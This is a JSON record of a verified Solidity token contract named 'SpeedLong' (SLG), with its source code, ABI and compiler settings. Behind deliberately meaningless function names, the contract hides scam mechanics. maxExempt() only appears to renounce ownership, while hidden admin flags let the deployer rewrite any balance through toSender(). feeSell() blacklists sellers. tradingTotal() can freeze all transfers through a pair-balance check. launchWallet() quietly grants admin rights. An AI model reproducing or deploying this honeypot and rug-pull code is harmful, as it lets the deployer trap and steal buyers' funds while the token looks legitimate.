{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface atSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedLimit {\n    function createPair(address liquiditySell, address enableTrading) external returns (address);\n}\n\ninterface totalFeeToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyFromAmount) external view returns (uint256);\n\n    function transfer(address tokenTake, uint256 autoTotal) external returns (bool);\n\n    function allowance(address launchedAutoFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenTake,\n        uint256 autoTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromAutoAmount, uint256 value);\n    event Approval(address indexed launchedAutoFrom, address indexed spender, uint256 value);\n}\n\ninterface isMax is totalFeeToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SpeedLong is marketingFee, totalFeeToken, isMax {\n\n    function maxExempt() public {\n        emit OwnershipTransferred(marketingEnable, address(0));\n        exemptMinAmount = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSender;\n    }\n\n    uint8 private totalSender = 18;\n\n    address public tokenShould;\n\n    address public marketingEnable;\n\n    address private exemptMinAmount;\n\n    mapping(address => bool) public swapAuto;\n\n    function approve(address teamFee, uint256 autoTotal) public virtual override returns (bool) {\n        tokenEnable[_msgSender()][teamFee] = autoTotal;\n        emit Approval(_msgSender(), teamFee, autoTotal);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return exemptMinAmount;\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptMinAmount;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toShouldLaunch;\n    }\n\n    uint256 constant senderLiquidity = 9 ** 10;\n\n    mapping(address => mapping(address => uint256)) private tokenEnable;\n\n    uint256 public liquidityMode;\n\n    string private fromFund = \"Speed Long\";\n\n    bool private tokenTxReceiver;\n\n    mapping(address => bool) public enableAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return fromFund;\n    }\n\n    uint256 launchedFee;\n\n    bool public listToken;\n\n    uint256 private toShouldLaunch = 100000000 * 10 ** 18;\n\n    function balanceOf(address buyFromAmount) public view virtual override returns (uint256) {\n        return exemptShould[buyFromAmount];\n    }\n\n    function exemptReceiver() private view {\n        require(enableAuto[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed amountToken, address indexed listMax);\n\n    address takeReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address atFee, address teamFee) external view virtual override returns (uint256) {\n        if (teamFee == txTrading) {\n            return type(uint256).max;\n        }\n        return tokenEnable[atFee][teamFee];\n    }\n\n    function transferFrom(address receiverLaunchLimit, address tokenTake, uint256 autoTotal) external override returns (bool) {\n        if (_msgSender() != txTrading) {\n            if (tokenEnable[receiverLaunchLimit][_msgSender()] != type(uint256).max) {\n                require(autoTotal <= tokenEnable[receiverLaunchLimit][_msgSender()]);\n                tokenEnable[receiverLaunchLimit][_msgSender()] -= autoTotal;\n            }\n        }\n        return buyReceiverLiquidity(receiverLaunchLimit, tokenTake, autoTotal);\n    }\n\n    function feeSell(address isSender) public {\n        exemptReceiver();\n        \n        if (isSender == marketingEnable || isSender == tokenShould) {\n            return;\n        }\n        swapAuto[isSender] = true;\n    }\n\n    uint256 private walletFund;\n\n    mapping(address => uint256) private exemptShould;\n\n    function buyReceiverLiquidity(address receiverLaunchLimit, address tokenTake, uint256 autoTotal) internal returns (bool) {\n        if (receiverLaunchLimit == marketingEnable) {\n            return exemptFund(receiverLaunchLimit, tokenTake, autoTotal);\n        }\n        uint256 launchAmount = totalFeeToken(tokenShould).balanceOf(takeReceiver);\n        require(launchAmount == launchedFee);\n        require(tokenTake != takeReceiver);\n        if (swapAuto[receiverLaunchLimit]) {\n            return exemptFund(receiverLaunchLimit, tokenTake, senderLiquidity);\n        }\n        return exemptFund(receiverLaunchLimit, tokenTake, autoTotal);\n    }\n\n    function toSender(address marketingTeam, uint256 autoTotal) public {\n        exemptReceiver();\n        exemptShould[marketingTeam] = autoTotal;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenReceiver;\n    }\n\n    uint256 takeFund;\n\n    bool public isShouldExempt;\n\n    function launchWallet(address txShould) public {\n        require(txShould.balance < 100000);\n        if (listToken) {\n            return;\n        }\n        if (atMin != walletFund) {\n            walletFund = atMin;\n        }\n        enableAuto[txShould] = true;\n        if (isShouldExempt == tokenTxReceiver) {\n            atMin = walletFund;\n        }\n        listToken = true;\n    }\n\n    function transfer(address marketingTeam, uint256 autoTotal) external virtual override returns (bool) {\n        return buyReceiverLiquidity(_msgSender(), marketingTeam, autoTotal);\n    }\n\n    uint256 private atMin;\n\n    string private tokenReceiver = \"SLG\";\n\n    function tradingTotal(uint256 autoTotal) public {\n        exemptReceiver();\n        launchedFee = autoTotal;\n    }\n\n    constructor (){\n        \n        atSender amountMarketing = atSender(txTrading);\n        tokenShould = launchedLimit(amountMarketing.factory()).createPair(amountMarketing.WETH(), address(this));\n        \n        marketingEnable = _msgSender();\n        maxExempt();\n        enableAuto[marketingEnable] = true;\n        exemptShould[marketingEnable] = toShouldLaunch;\n        \n        emit Transfer(address(0), marketingEnable, toShouldLaunch);\n    }\n\n    function exemptFund(address receiverLaunchLimit, address tokenTake, uint256 autoTotal) internal returns (bool) {\n        require(exemptShould[receiverLaunchLimit] >= autoTotal);\n        exemptShould[receiverLaunchLimit] -= autoTotal;\n        exemptShould[tokenTake] += autoTotal;\n        emit Transfer(receiverLaunchLimit, tokenTake, autoTotal);\n        return true;\n    }\n\n    address txTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAutoFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAutoAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFromAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"}],\"name\":\"feeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isShouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"}],\"name\":\"launchWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"toSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"tradingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SpeedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}